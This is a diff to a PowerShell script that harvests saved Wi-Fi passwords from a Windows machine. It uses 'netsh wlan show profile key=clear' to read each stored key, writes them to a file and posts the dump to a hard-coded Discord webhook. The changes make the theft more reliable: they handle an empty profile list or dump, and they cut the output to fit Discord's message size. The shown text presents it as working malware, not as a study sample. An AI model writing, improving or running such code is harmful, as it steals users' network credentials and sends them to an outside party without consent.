@@ -8,14 +8,21 @@ try {
     $profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
         ($_ -split ":")[1].Trim()
     }
-    foreach ($p in $profiles) {
-        $details = netsh wlan show profile name="$p" key=clear
-        $key = ($details | Select-String "Key Content") -replace ".*:\s*", ""
-        if ($key) { "$p : $key" | Out-File $out -Append }
+    if ($profiles) {
+        foreach ($p in $profiles) {
+            $details = netsh wlan show profile name="$p" key=clear
+            $key = ($details | Select-String "Key Content") -replace ".*:\s*", ""
+            if ($key) { "$p : $key" | Out-File $out -Append }
+        }
+    } else {
+        "(no wifi profiles found)" | Out-File $out -Append
     }
 
     $body = Get-Content $out -Raw
+    if ([string]::IsNullOrWhiteSpace($body)) { $body = "(empty dump)" }
     $body = $body -replace "\\", "/"
+    $body = $body.Substring(0, [Math]::Min(1900, $body.Length))
+
     $payload = @{ content = $body } | ConvertTo-Json -Compress
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
     Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1519137397022130196/X1Pyzeu-cYDoWXpEb5Evo9KFNKgpoeOhdLEsS9NbLWy5gvKkvqeqOZlxuCQV92Xi5XYT" -Method Post -Body $bytes -ContentType "application/json; charset=utf-8"
